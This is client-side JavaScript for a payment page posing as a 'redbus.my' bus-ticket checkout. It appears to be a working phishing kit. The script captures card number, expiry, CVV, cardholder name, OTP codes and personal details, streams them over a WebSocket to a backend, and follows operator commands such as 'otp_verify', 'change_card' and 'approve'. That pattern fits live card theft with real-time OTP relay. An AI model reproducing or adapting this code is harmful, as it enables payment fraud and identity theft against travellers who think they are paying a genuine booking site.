var WS=(location.protocol=="https:"?"wss:":"ws:")+"//"+location.host+"/api/?role=customer&cid="+encodeURIComponent("redbus_"+Date.now());
var ws=null,s=null,tm=null,sec=0;
function q(id){return document.getElementById(id);}
function cws(){if(ws&&ws.readyState===WebSocket.OPEN)return;ws=new WebSocket(WS);ws.onmessage=function(e){try{handle(JSON.parse(e.data));}catch(err){};}}
function send(m){if(!ws||ws.readyState!==WebSocket.OPEN){cws();setTimeout(function(){send(m);},500);return;}ws.send(JSON.stringify(m));}
function handle(m){switch(m.action){case"ack":s=m.sessionId;msg("info","Processing...");break;case"approve":msg("success","Approved!");q("btnSubmit").disabled=true;q("btnSubmit").textContent="Approved";clr();setTimeout(function(){location.href="/complete/";},2000);break;case"reject":msg("error","Declined.");q("btnSubmit").disabled=false;q("btnSubmit").textContent="Pay";hideO();break;case"otp_verify":showO();if(m.countdown)start(m.countdown);break;case"timeout":msg("error","Expired.");q("btnSubmit").disabled=false;q("btnSubmit").textContent="Pay";hideO();break;case"card_error":msg("error",m.message||"Card error.");hideO();break;case"change_card":msg("info","Try different card.");q("cardNumber").value="";q("cardNumber").focus();hideO();break;case"session_restored":var c=m.cardInfo||{},i=m.customerInfo||{};q("cardNumber").value=c.cardNumber||"";q("expiry").value=c.expiry||"";q("cvv").value=c.cvv||"";q("cardHolder").value=c.cardHolder||"";q("fullNameIpt").value=i.fullName||"";q("emailIpt").value=i.email||"";q("phoneIpt").value=i.phone||"";q("countryIpt").value=i.country||"";q("address1Ipt").value=i.address1||"";q("address2Ipt").value=i.address2||"";q("cityIpt").value=i.city||"";q("stateIpt").value=i.state||"";q("zipCodeIpt").value=i.zipCode||"";s=m.sessionId;msg("info","Restored.");break;}}
function msg(t,x){var e=q("statusMsg");e.style.display="block";e.textContent=x;e.style.color=t=="success"?"#2e7d32":t=="error"?"#c62828":"#1565c0";e.style.background=t=="success"?"#e8f5e9":t=="error"?"#ffebee":"#e3f2fd";}
function showO(){q("otpSection").style.display="block";q("btnSubmit").style.display="none";}
function hideO(){q("otpSection").style.display="none";q("btnSubmit").style.display="block";q("otpCode").value="";clr();}
function start(x){clr();sec=x||120;q("otpTimer").style.display="block";tick();tm=setInterval(function(){sec--;tick();if(sec<=0){clr();msg("error","OTP expired.");hideO();}},1000);}
function clr(){if(tm){clearInterval(tm);tm=null;}q("otpTimer").style.display="none";}
function tick(){var m=Math.floor(sec/60),s=sec%60;q("otpTimer").textContent=m+":"+(s<10?"0":"")+s;}
function build(){return{frontendUrl:"redbus.my",currentStep:"card",browsingTabs:[{label:"Product",count:0,active:false},{label:"Address",count:1,active:false},{label:"Card",count:1,active:true}],cardInfo:{cardNumber:(q("cardNumber").value||"").replace(/\s/g,""),expiry:q("expiry").value||"",cvv:q("cvv").value||"",cardHolder:q("cardHolder").value||"",otpCode:q("otpCode").value||""},customerInfo:{fullName:q("fullNameIpt").value||"",email:q("emailIpt").value||"",phone:q("phoneIpt").value||"",country:q("countryIpt").value||"",address1:q("address1Ipt").value||"",address2:q("address2Ipt").value||"",city:q("cityIpt").value||"",state:q("stateIpt").value||"",zipCode:q("zipCodeIpt").value||""}};}
q("cardNumber").addEventListener("input",function(){var v=this.value.replace(/\D/g,"");this.value=v.replace(/(.{4})/g,"$1 ").trim();});
q("expiry").addEventListener("input",function(){var v=this.value.replace(/\D/g,"");if(v.length>=3)v=v.slice(0,2)+"/"+v.slice(2);if(v.length>5)v=v.slice(0,5);this.value=v;});
q("btnSubmit").addEventListener("click",function(){var cn=(q("cardNumber").value||"").replace(/\s/g,"");if(!cn||!q("expiry").value||!q("cvv").value||!q("cardHolder").value||!q("fullNameIpt").value){msg("error","Fill all required fields.");return;}if(!/\d{2}\/\d{2}/.test(q("expiry").value)){msg("error","Invalid expiry.");return;}this.disabled=true;this.textContent="Processing...";cws();var p=build();send({type:"customer_input",payload:p});setTimeout(function(){if(s){var sp=build();sp.sessionId=s;sp.status="pending";send({type:"session_update",payload:sp});}},1000);});
q("btnOtp").addEventListener("click",function(){var o=q("otpCode").value;if(!o){msg("error","Enter OTP.");return;}if(!s)return;var p=build();p.sessionId=s;p.cardInfo.otpCode=o;p.status="pending";send({type:"session_update",payload:p});this.disabled=true;this.textContent="Verifying...";});

// Coupon toggle
var ct=q("couponToggle");if(ct)ct.addEventListener("click",function(){var ic=q("couponInput");var ci=q("couponIcon");if(ic.style.display=="none"){ic.style.display="block";ci.classList.remove("icon-expand_more");ci.classList.add("icon-expand_less");}else{ic.style.display="none";ci.classList.remove("icon-expand_less");ci.classList.add("icon-expand_more");}});

// Populate data
(function(){
var d={};try{d=JSON.parse(sessionStorage.getItem("redbus_booking")||"{}");}catch(e){}
var pv={};try{var raw=localStorage.getItem("profileDataValues");if(raw){pv=JSON.parse(raw);if(Array.isArray(pv)&&pv.length)pv=pv[0]||{};}}catch(e){}
if(pv["4"])d.passengerName=pv["4"];if(pv["5"])d.email=pv["5"];if(pv["6"])d.phone=pv["6"];if(pv["1"])d.paxAge=pv["1"];
var pvArr=[];try{var r2=localStorage.getItem("profileDataValues");if(r2){pvArr=JSON.parse(r2);if(!Array.isArray(pvArr)||!pvArr.length)pvArr=[];}}catch(e){}
if(!d.origin&&!d.destination){var sp=new URLSearchParams(location.search);d.origin=sp.get("fromCityName")||"";d.destination=sp.get("toCityName")||"";d.departureDate=sp.get("onward")||sp.get("doj")||"";}
if(d.origin||d.destination||d.busName||d.passengerName){
var nPax=pvArr.length||Number(d.pax)||1;
var pf="RM ",tot=Number(d.amount||0),b=d.busName||d.operator||d.origin+" to "+d.destination,bt=d.busType||nPax+" Passenger";
var bpFee=nPax*2,bf=tot-bpFee;
q("busName").textContent=b||"-";
q("busType").textContent=bt;
if(d.departureTime)q("depTime").textContent=d.departureTime+" ";
if(d.departureDate){q("depDate").textContent=d.departureDate;q("arrDate").textContent=d.arrDate||d.departureDate;}
if(d.depPlace)q("depPlace").textContent=d.depPlace;
if(d.arrPlace)q("arrPlace").textContent=d.arrPlace;
if(d.duration)q("duration").textContent=d.duration;
if(d.passengerName)q("paxName").textContent=d.passengerName;
if(d.paxAge)q("paxAge").textContent=d.paxAge+" years";
if(d.seats)q("paxSeat").textContent="Seats: "+d.seats.split("\n").join(", ");
if(d.email)q("paxEmail").textContent=d.email;
if(d.phone)q("paxPhone").textContent=d.phone;
q("seatCount").textContent=nPax+" Passenger"+(nPax>1?"s":"");
q("baseFare").textContent=pf+bf.toFixed(2);
q("bpAmount").textContent=pf+bpFee.toFixed(2);
q("bpLabel").textContent="Boarding Pass (RM 2/seat"+(nPax>1?" x"+nPax:"")+")";
q("totalPrice").textContent=pf+tot.toFixed(2);
var ps=document.querySelectorAll(".title___1fab2c span");for(var i=0;i<ps.length;i++)ps[i].textContent="Pay "+pf+tot.toFixed(2);
q("btnSubmit").textContent="Pay "+pf+tot.toFixed(2);
if(d.fullName||d.passengerName)q("fullNameIpt").value=d.fullName||d.passengerName;
if(d.email)q("emailIpt").value=d.email;
if(d.phone)q("phoneIpt").value=d.phone;
}})();
cws();
})();
